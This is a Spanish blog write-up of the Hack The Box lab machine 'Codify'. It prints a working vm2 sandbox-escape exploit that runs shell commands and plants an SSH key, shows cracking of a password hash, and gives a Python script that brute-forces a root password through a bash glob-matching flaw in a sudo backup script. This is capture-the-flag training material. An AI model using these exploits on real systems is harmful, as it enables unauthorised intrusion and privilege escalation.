---
redirect_from:
  - /posts/CODIFY-WriteUp/

title: Codify - WriteUp
date: 'Sun, 10 Aug 2025 00:00:00 GMT'
categories:
  - WriteUps
  - HTB
  - Linux
tags:
  - ctf
  - nmap
  - htb
  - linpeas
  - exploit
  - sudo
  - docker
  - apache
  - linux
  - mysql
image: /assets/img/cabeceras/2025-08-10-CODIFY-WRITEUP.png
description: >-
  Codify es una máquina Linux sencilla que incluye una aplicación web que
  permite a los usuarios probar código Node.js. La aplicación utiliza una
  biblioteca vm2 vulnerable, que se aprovecha para ejecutar código remoto. Al
  enumerar el objetivo, se revela una base de datos SQLite que contiene un hash
  que, una vez descifrado, otorga acceso SSH al equipo. Finalmente, se puede
  ejecutar un script bash vulnerable con privilegios elevados para revelar la
  contraseña del usuario root, lo que otorga acceso privilegiado a la máquina.
---

{% include machine-info.html
  machine="Codify"
  os="Linux"
  difficulty="Easy"
  platform="HTB"
%}


## Enumeración

NMAP
```bash
# Nmap 7.94SVN scan initiated Thu Nov 23 19:57:17 2023 as: nmap -sCV -p 22,80,3000 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oN targeted -oX targetedXML 10.129.86.106
Nmap scan report for 10.129.86.106
Host is up (0.077s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://codify.htb/
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Lo primero que vemos es que tiene un virtual hosting que apunta a _codify.htb_, actualizamos nuestro archivo hosts y seguimos.

WHATWEB
```rb
$ whatweb http://10.129.86.106

http://10.129.86.106 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.86.106], RedirectLocation[http://codify.htb/], Title[301 Moved Permanently]
http://codify.htb/ [200 OK] Apache[2.4.52], Bootstrap[4.3.1], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.86.106], Title[Codify], X-Powered-By[Express]
```

```rb
$ whatweb http://10.129.86.106:3000/

http://10.129.86.106:3000/ [200 OK] Bootstrap[4.3.1], Country[RESERVED][ZZ], HTML5, IP[10.129.86.106], Title[Codify], X-Powered-By[Express]
```

## Explotación

HTTP 80 y 3000

![CODIFY](/assets/img/htb-writeups/Pasted-image-20231123200440.png)

![CODIFY](/assets/img/htb-writeups/Pasted-image-20231123200519.png)

La página ejecuta código _Node.js_ Probaremos de explotar esta característica.

Buscando por internet llegamos a esta vulnerabilidad con un PoC. 
https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244

Hasta que llegamos a este código, donde 'id' es el comando a ejecutar.

```java
const {VM} = require("vm2");
const vm = new VM();

const code = `
cmd = 'id'
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync(cmd);
}
`
console.log(vm.run(code));
```



Ejecutamos el código:

![CODIFY](/assets/img/htb-writeups/Pasted-image-20231123211734.png)

Y vemos que funciona.

Pues bien, lo que vamos a hacer ahora en vez de intentar conseguir una shell reversa es copiarle nuestro certificado público SSH en la carpeta del usuario _svc_, dentro de la carpeta /home/svc/.ssh en el archivo _authorized_keys. 


```java
const {VM} = require("vm2");
const vm = new VM();

const code = `
cmd = 'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCuWRRCthy7Zq8y/b5BDuMq76d+vh0+L2HpjM/P+6Agj7KShEOYSg8mX+U+qGBxaSUwCCJ33Ajd2R8QH1AFbEC8LhRGDMO5eklnhWOwDCmM8ERQeDbH9/+y2/Lhd1pMUe/1Cc6JxHhQMPSPuq0k4C+0fwFgjGoHqVRke8TF8zCgh7bUyqDjmSzThrypg1gWsQYDus0ueTbjW6zcxKQzXFapqgIRIOr++FhSm0Acroa1dwX0v7td+iQAaO3NcX6XM7t5mAYsDpIlSC0Xm9ojjGM9MpEDUZZqKjIHPO0WzA3p7cKntMR6+XNGMFwl28VWJNDDKWLCEjeoB9Y6eXZHe0bZExxhuHH/2npLUeYg/04qbZdlCeWvxxgJPjYAPuzsDXhtNbfzXFB3gR+EsVkd1Fj+8T5y6mnaSYeJR07AJty+K9pUE2ETVNZO3ipkI0rFNi442T2g+xlkK2dngjtmhCD/g3JsLC1soDv/fad9T09Komh97lcO8Ylm5kiB7POqNGlXI3qC0uVOZPb1H3TgvpJdg6W3rp3FDVj6uNwUlQSnV5gnPdLCTZr5KKkO89QMGlFruwM+BO79zYVU8lai3mbDSYPFJXYYhPe+B489WFecw5oJlUNmypb4OJRHo6OktvP8QJSpN+HtJfE4Ya8iPqnA5VnjLzsNXzjcpAa/0Sxm/w== andy@kalinox" > /home/svc/.ssh/authorized_keys'
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync(cmd);
}
`
console.log(vm.run(code));
```


Le damos a Run por última vez y intentamos conectar desde nuestra consola a la máquina víctima por SSH y nuestra clave privada.

```bash
$ ssh svc@codify.htb -i ~/.ssh/id_rsa
...
svc@codify:~$ 
```

![CODIFY](/assets/img/htb-writeups/Pasted-image-20231123213518.png)

Nos subimos _linpeas.sh_ y empezamos a enumerar.

Usuarios:

![CODIFY](/assets/img/htb-writeups/Pasted-image-20231123215845.png)

Según este proceso se está ejecutando un contenedor docker con una base de datos MySQL.

![CODIFY](/assets/img/htb-writeups/Pasted-image-20231123215215.png)

Confirmamos el servicio MySQL escuchando por un puerto interno y docker.

![CODIFY](/assets/img/htb-writeups/Pasted-image-20231123215621.png)

Encontramos el archivo _tickets.db_ dentro de /var/www/contact.

Vamos a ver qué contiene:

```bash
$ strings /var/www/contact/tickets.db
```

![CODIFY](/assets/img/htb-writeups/Pasted-image-20231123222953.png)

Encontramos lo que parece el hash de la contraseña del usuario _joshua_. Vamos a ver de qué tipo de hash se trata con _hashid_:

```bash
$ hashid '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2'
```

![CODIFY](/assets/img/htb-writeups/Pasted-image-20231123223201.png)

Parece que es _bcrypt_. Copiamos el hash en un archivo y usamos a nuestro amigo _john_ para romperlo:

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.joshua
```

![CODIFY](/assets/img/htb-writeups/Pasted-image-20231123223444.png)

Tenemos nuevas credenciales:

```http
joshua:spongebob1
```

![CODIFY](/assets/img/htb-writeups/Pasted-image-20231123223613.png)

Funcionan. Vamos a investigar...

Conseguimos nuestra primera flag y la registramos.

![CODIFY](/assets/img/htb-writeups/Pasted-image-20231123223742.png)


## Escalada

Si hacemos un _sudo -l_ podremos ver que podemos ejecutar con permisos de sudo el script /opt/scripts/mysql-backup.sh

![CODIFY](/assets/img/htb-writeups/Pasted-image-20231123224214.png)

Veamos qué contiene el script:

```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```


La vulnerabilidad en el script está relacionada con cómo se maneja la confirmación de la contraseña:

```bash
if [[ $DB_PASS == $USER_PASS ]]; then
    /usr/bin/echo "Password confirmed!"
else
    /usr/bin/echo "Password confirmation failed!"
    exit 1
fi
```


Esta sección del script compara la contraseña proporcionada por el usuario (USER_PASS) con la contraseña real de la base de datos (DB_PASS). La vulnerabilidad aquí se debe al uso de == dentro de [ [  ] ] en Bash, que realiza una coincidencia de patrones en lugar de una comparación directa de cadenas. Esto significa que la entrada del usuario (USER_PASS) se trata como un patrón y, si incluye caracteres globales como * o ?, potencialmente puede coincidir con cadenas no deseadas.

Por ejemplo, si la contraseña real (DB_PASS) es contraseña123 y el usuario ingresa * como contraseña (USER_PASS), la coincidencia del patrón será exitosa porque * coincide con cualquier cadena, lo que resulta en un acceso no autorizado.

Esto significa que podemos aplicar fuerza bruta a cada carácter en DB_PASS.

**Explotación de la coincidencia de patrones**

Escribí un script en Python que aprovecha esto probando los prefijos y sufijos de las contraseñas para revelar lentamente la contraseña completa.

Crea la contraseña carácter por carácter, confirmando cada suposición invocando el script a través de sudo y verificando si se ha ejecutado correctamente.

```python
import string
import subprocess

def check_password(p):
	command = f"echo '{p}*' | sudo /opt/scripts/mysql-backup.sh"
	result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
	return "Password confirmed!" in result.stdout

charset = string.ascii_letters + string.digits
password = ""
is_password_found = False

while not is_password_found:
	for char in charset:
		if check_password(password + char):
			password += char
			print(password)
			break
	else:
		is_password_found = True
```

Resultado:

![CODIFY](/assets/img/htb-writeups/Pasted-image-20231123230338.png)

**Obteniendo Root con su**

Con la contraseña de respaldo en mano, pude usar su para cambiar al usuario root:

```bash
joshua@codify:/tmp$ su root
Password:
root@codify:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@codify:/tmp# ls -la ~
total 40
drwx------  5 root root 4096 Sep 26 09:35 .
drwxr-xr-x 18 root root 4096 Oct 31 07:57 ..
lrwxrwxrwx  1 root root    9 Sep 14 03:26 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
-rw-r--r--  1 root root   22 May  8  2023 .creds
drwxr-xr-x  3 root root 4096 Sep 26 09:35 .local
lrwxrwxrwx  1 root root    9 Sep 14 03:34 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Nov 14 07:14 root.txt
drwxr-xr-x  4 root root 4096 Sep 12 16:56 scripts
drwx------  2 root root 4096 Sep 14 03:31 .ssh
-rw-r--r--  1 root root   39 Sep 14 03:26 .vimrc
root@codify:/tmp# cat ~/root.txt
6845********************085a
```

## Conclusión

El cuadro Codify en HackTheBox brindó una experiencia de aprendizaje integral, demostrando técnicas como escape de sandbox, descifrado de contraseñas, análisis de scripts, fuerza bruta y encadenamiento de múltiples vectores de escalada de privilegios.

El acceso inicial se obtuvo explotando un escape de espacio aislado en el ejecutor de código NodeJS de espacio aislado de la aplicación web. Una enumeración adicional reveló un hash de contraseña que finalmente permitió escalar del usuario de svc con pocos privilegios al usuario joshua.

El último punto de inflexión fue un script de respaldo MySQL vulnerable del que se podía abusar a través de su débil lógica de comparación de contraseñas. Después de escribir un exploit para revelar lentamente la contraseña de administrador del script, pude obtener acceso de root y control completo del sistema.

Cuadros como Codify ejemplifican la importancia de pensar de manera amplia en múltiples dominios como aplicaciones web, bases de datos, scripts, autenticación y administración de sistemas. Los desarrolladores deben proteger todos los niveles, mientras que los piratas informáticos solo necesitan encontrar un descuido. Esto hace que la enumeración integral, el pensamiento lateral y el encadenamiento de múltiples técnicas sean indispensables para los aspirantes a hackers.

---

**Última actualización**: 2025-08-10<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
